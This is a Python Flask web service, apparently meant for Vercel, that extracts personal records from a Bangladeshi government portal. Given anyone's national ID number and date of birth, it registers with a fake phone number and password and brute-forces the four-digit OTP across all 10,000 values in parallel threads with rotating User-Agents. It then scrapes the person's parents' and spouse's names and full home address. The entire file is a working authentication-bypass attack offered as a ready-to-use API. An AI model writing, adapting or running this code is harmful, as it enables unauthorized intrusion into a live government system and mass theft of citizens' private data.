from flask import Flask, request, jsonify
import requests
import random
import string
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import json
import os
import time

app = Flask(__name__)

# User-Agent list for rotation
USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36'
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def random_mobile(prefix="016"):
    return prefix + f"{random.randint(10000000, 99999999):08d}"

def random_password():
    return "#" + random.choice(string.ascii_uppercase) + ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def get_session_and_bypass(nid, dob, mobile, password):
    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor"
    
    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cache-Control': 'max-age=0',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Origin': 'https://fsmms.dgf.gov.bd',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    data = {
        "nidNumber": nid,
        "email": "",
        "mobileNo": mobile,
        "dateOfBirth": dob,
        "password": password,
        "confirm_password": password,
        "next1": ""
    }
    
    session = requests.Session()
    # Add timeout and retry mechanism
    try:
        response = session.post(url, data=data, headers=headers, allow_redirects=False, timeout=30)
        
        if response.status_code == 302 and 'mov-verification' in response.headers.get('Location', ''):
            return session
        else:
            raise Exception(f"Bypass Failed - Status: {response.status_code}")
    except requests.exceptions.Timeout:
        raise Exception("Request timeout during bypass")
    except requests.exceptions.RequestException as e:
        raise Exception(f"Network error during bypass: {str(e)}")

def try_otp(session, otp):
    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step"
    
    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cache-Control': 'max-age=0',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Origin': 'https://fsmms.dgf.gov.bd',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    data = {
        "otpDigit1": otp[0],
        "otpDigit2": otp[1],
        "otpDigit3": otp[2],
        "otpDigit4": otp[3]
    }
    
    try:
        response = session.post(url, data=data, headers=headers, allow_redirects=False, timeout=15)
        
        if response.status_code == 302 and 'movementContractor/form' in response.headers.get('Location', ''):
            return otp
        return None
    except:
        return None

def try_batch(session, otp_batch):
    with ThreadPoolExecutor(max_workers=20) as executor:  # Reduced workers for Vercel
        future_to_otp = {executor.submit(try_otp, session, otp): otp for otp in otp_batch}
        for future in as_completed(future_to_otp):
            result = future.result()
            if result:
                executor.shutdown(wait=False)
                return result
    return None

def fetch_form_data(session):
    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"
    
    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    try:
        response = session.get(url, headers=headers, timeout=30)
        return response.text
    except requests.exceptions.Timeout:
        raise Exception("Timeout while fetching form data")
    except requests.exceptions.RequestException as e:
        raise Exception(f"Network error while fetching form: {str(e)}")

def extract_fields(html, ids):
    result = {}
    for field_id in ids:
        pattern = rf'<input[^>]*id="{field_id}"[^>]*value="([^"]*)"'
        match = re.search(pattern, html)
        result[field_id] = match.group(1) if match else ""
    return result

def enrich_data(nid, dob, contractor_name, result):
    mapped = {
        "nameBangla": contractor_name,
        "nameEnglish": "",
        "nationalId": nid,
        "dateOfBirth": dob,
        "fatherName": result.get("fatherName", ""),
        "motherName": result.get("motherName", ""),
        "spouseName": result.get("spouseName", ""),
        "gender": "",
        "religion": "",
        "birthPlace": result.get("nidPerDistrict", ""),
        "nationality": result.get("nationality", ""),
        "division": result.get("nidPerDivision", ""),
        "district": result.get("nidPerDistrict", ""),
        "upazila": result.get("nidPerUpazila", ""),
        "union": result.get("nidPerUnion", ""),
        "village": result.get("nidPerVillage", ""),
        "ward": result.get("nidPerWard", ""),
        "zip_code": result.get("nidPerZipCode", ""),
        "post_office": result.get("nidPerPostOffice", "")
    }

    address_parts = [
        f"বাসা/হোল্ডিং: {result.get('nidPerHolding', '-')}",
        f"গ্রাম/রাস্তা: {result.get('nidPerVillage', '')}",
        f"মৌজা/মহল্লা: {result.get('nidPerMouza', '')}",
        f"ইউনিয়ন ওয়ার্ড: {result.get('nidPerUnion', '')}",
        f"ডাকঘর: {result.get('nidPerPostOffice', '')} - {result.get('nidPerZipCode', '')}",
        f"উপজেলা: {result.get('nidPerUpazila', '')}",
        f"জেলা: {result.get('nidPerDistrict', '')}",
        f"বিভাগ: {result.get('nidPerDivision', '')}"
    ]
    address_line = ", ".join([p for p in address_parts if p.split(": ")[1]])

    mapped["permanentAddress"] = address_line
    mapped["presentAddress"] = address_line
    return mapped

@app.route('/')
def home():
    return jsonify({
        "message": "NID Information Extractor API",
        "status": "active",
        "endpoint": "/get-info?nid=YOUR_NID&dob=YYYY-MM-DD",
        "example": "https://your-app.vercel.app/get-info?nid=1234567890&dob=1990-01-01"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": time.time()})

@app.route('/get-info', methods=['GET'])
def get_info():
    try:
        nid = request.args.get('nid')
        dob = request.args.get('dob')
        
        if not nid or not dob:
            return jsonify({'error': 'NID and DOB are required'}), 400

        # Validate DOB format (YYYY-MM-DD)
        if not re.match(r'\d{4}-\d{2}-\d{2}', dob):
            return jsonify({'error': 'DOB must be in YYYY-MM-DD format'}), 400

        # ==================== CONFIG ====================
        mobile_prefix = "016"
        batch_size = 200  # Reduced for Vercel limits

        # OTP range
        otp_range = [f"{i:04d}" for i in range(10000)]

        # Generate random credentials
        mobile = random_mobile(mobile_prefix)
        password = random_password()
        
        print(f"Using Mobile: {mobile}")
        print(f"Using Password: {password}")
        
        # Step 1: Get session and bypass initial verification
        print("Step 1: Bypassing initial verification...")
        session = get_session_and_bypass(nid, dob, mobile, password)
        print("✓ Initial bypass successful")
        
        # Step 2: Try OTPs in batches
        print("Step 2: Brute-forcing OTP...")
        random.shuffle(otp_range)
        found_otp = None
        
        for i in range(0, len(otp_range), batch_size):
            batch = otp_range[i:i+batch_size]
            print(f"Trying batch {i//batch_size + 1}/{(len(otp_range)//batch_size)+1}...")
            found_otp = try_batch(session, batch)
            if found_otp:
                print(f"✓ OTP found: {found_otp}")
                break
        
        if found_otp:
            # Step 3: Fetch form data
            print("Step 3: Fetching form data...")
            html = fetch_form_data(session)
            
            # Step 4: Extract and enrich data
            field_ids = [
                "contractorName", "fatherName", "motherName", "spouseName", 
                "nidPerDivision", "nidPerDistrict", "nidPerUpazila", "nidPerUnion", 
                "nidPerVillage", "nidPerWard", "nidPerZipCode", "nidPerPostOffice",
                "nidPerHolding", "nidPerMouza"
            ]
            
            extracted_data = extract_fields(html, field_ids)
            final_data = enrich_data(nid, dob, extracted_data.get("contractorName", ""), extracted_data)
            
            print("\n" + "="*50)
            print("EXTRACTED DATA:")
            print("="*50)
            print(json.dumps(final_data, ensure_ascii=False, indent=2))
            
            return jsonify({
                "success": True,
                "data": final_data,
                "metadata": {
                    "otp_used": found_otp,
                    "mobile_used": mobile,
                    "timestamp": time.time()
                }
            }), 200
            
        else:
            print("✗ OTP not found")
            return jsonify({
                "success": False,
                "error": "OTP not found after trying all combinations"
            }), 404
            
    except Exception as e:
        print(f"Error: {str(e)}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

# Vercel specific handler
def handler(request):
    return app(request)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
